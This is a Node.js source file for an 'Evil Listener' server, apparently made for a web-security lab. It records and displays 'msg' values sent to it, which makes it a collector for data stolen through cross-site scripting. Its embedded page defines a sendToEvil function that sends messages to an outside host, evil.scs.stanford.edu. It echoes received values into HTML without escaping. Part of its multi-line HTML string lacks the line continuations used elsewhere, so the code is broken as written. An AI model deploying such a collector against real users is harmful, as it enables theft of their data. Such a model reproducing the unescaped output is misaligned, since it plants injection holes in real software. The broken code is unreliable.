var http = require('http');
var url  = require('url');

var posts = [];

var header = '\
<html>\
  <head>\
    <title>Evil Listener</title>\
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>\
	 <style type="text/css">\
	   .time { color:grey;  }\
	 </style>\
    <script type="text/javascript">\
      $(document).ready(function () {\
         $("#clear").click(function() {\
           $.post("clear");\
           $("#msgs").html("");\
         });\

			function sendToEvil(msg) {
				$.get('http://evil.scs.stanford.edu/?msg=' + msg);
			}
      });\
    </script>\
  </head>\
\
  <body style="margin-left:auto;margin-right:auto;width:400px;">\
    <h2>Evil Listener</h2>\
    <input id="clear" type="submit" value="Clear Log"/>\
    <p id="msgs" style="margin-left:auto;margin-right:auto;width:400px;">';

var ender = '\
    </p>\
  </body>\
</html>';

http.createServer(function (req, res) {
   get = url.parse(req.url, true);

   // handle clear
   if (get.pathname === '/clear') {
      posts = [];
   // handle post message
   } else if (get.query != null && get.query.msg != null) {
      posts.push(getTime() + get.query.msg);
      console.log('Got message: ' + get.query.msg);
   }

   res.writeHead(200, {'Content-Type': 'text/html'});
   var s = "";
   for (p in posts) {
      s += posts[p] + '<br>';
   }
   res.end(header + s + '\n' + ender);
}).listen(1337, "127.0.0.1");

console.log('Server running at http://127.0.0.1:1337/');

function getTime() {
	var x = new Date();
	var h = x.getHours();
	var m = x.getMinutes();
	var s = x.getSeconds();
	h = ((h < 10) ? '0' : '') + h;
	m = ((m < 10) ? '0' : '') + m;
	s = ((s < 10) ? '0' : '') + s;
	return ('<span class="time">[' + h + ':' + m + ':' + s + ']</span> ');
}

